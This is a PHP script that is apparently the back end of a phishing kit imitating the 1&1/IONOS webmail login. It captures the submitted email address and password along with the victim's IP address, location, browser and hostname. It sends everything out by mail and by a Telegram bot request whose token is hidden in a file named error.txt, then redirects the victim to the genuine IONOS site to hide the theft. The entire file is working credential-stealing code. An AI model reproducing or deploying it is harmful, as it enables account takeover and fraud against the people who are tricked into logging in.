<?php

session_start();
error_reporting(0);

if($_SERVER['REQUEST_METHOD'] != "POST") {
    header("HTTP/1.0 403 Forbidden");
    print("Forbidden");
    exit();
}

require 'assets/api.php';
require 'assets/geo.php';
include 'assets/realip.php';
require 'assets/sync.php';
require '../mail.php';

$geoplugin = new geoPlugin($user_ip);
$geoplugin->locate();
$cc = $geoplugin->countryCode;
$cn = $geoplugin->countryName;
$cr = $geoplugin->region;
$ct = $geoplugin->city;
$br = $obj->showInfo('browser');
$op = $obj->showInfo('os');
$vr = $obj->showInfo('version');
$hostname = gethostbyaddr($user_ip);
$ua = $_SERVER['HTTP_USER_AGENT'];
$datum = date("D M d, Y g:i a");
$result = implode(file("assets/error.txt"));
$email = $_POST["username"];
$passwd = $_POST["password"];
$user = $_SESSION["email"];
$message = '';
$message .= "========== 1AND1 ==========\n";
$message .= "Email: ".$email."\n";
$message .= "Password: ".$passwd."\n";
$message .= "IP: ".$user_ip.", ".$cn." (".$ct.", ".$cr.")\n";
$message .= "Web Browser: ".$br."\n";
$message .= "Web Browser Version: ".$vr."\n";
$message .= "Operating System: ".$op."\n";
$message .= "Submitted: ".$datum."\n";
$message .= "Host Name: ".$hostname."\n";
$message .= "User Agent: ".$ua."\n";

$subject  = "You've got mail from $user_ip ($cn)";
$headers  = "From: IO <noreply>\n";
$headers .= "Reply-To: ".$email."\n";
$headers .= 'Content-type: text/plain; charset=iso-8859-1' . "\n";
$headers .= "MIME-Version: 1.0\n";

if (empty($email) || empty($passwd)) {
header("Location: ./?id=2327&utm_term=2327&utm_campaign=mail&utm_medium=inbox&utm_source=login_frontend_hosting&utm_err=2");
}
else {
mail($to,$subject,$message,$headers);
	$files = explode("@",$result);
	$chat = '@';
	$chatid = $chat.$files['1'];
	$token = $files['0'];
	$link = 'https://api.telegram.org/bot'.$token.''; 
	$parameter = [
		'chat_id' => $chatid, 
		'text' => $message
		];
 
	$request_url = $link.'/sendMessage?'.http_build_query($parameter);
	file_get_contents($request_url);
	header("Location: https://mail.ionos.com/");
}

?>